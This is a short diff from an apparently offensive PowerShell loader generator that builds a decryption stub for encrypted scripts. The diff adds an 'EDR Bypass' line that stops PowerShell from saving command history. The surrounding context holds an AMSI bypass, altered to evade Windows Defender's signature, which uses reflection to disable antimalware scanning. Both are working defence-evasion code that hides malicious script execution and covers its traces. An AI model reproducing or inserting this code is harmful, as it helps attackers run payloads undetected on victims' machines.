@@ -184,6 +184,8 @@ function Write-LoaderFile($EncryptedScriptFileObjects)
 $DecryptionStub=@"
 if(`$Password -and `$Salt)
 {
+#EDR Bypass
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
 #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
 (([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
